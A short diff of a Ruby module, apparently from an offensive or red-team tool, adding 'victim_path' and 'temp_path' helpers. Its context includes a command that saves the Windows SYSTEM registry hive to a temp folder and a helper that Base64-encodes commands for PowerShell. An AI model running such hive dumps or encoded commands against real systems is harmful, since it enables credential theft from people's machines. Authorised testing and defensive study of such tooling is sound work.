@@ -48,6 +48,12 @@ module MainCommands
   def save_sys
     'reg.exe save HKLM\SYSTEM c:\windows\temp\sys'
   end
+  def victim_path
+    'c:\\windows\\temp\\'
+  end
+  def temp_path
+    'c:\\windows\\temp\\test.txt'
+  end
   def encode_command(command)
     Base64.encode64(command.encode('utf-16le')).delete("\r\n")
   end
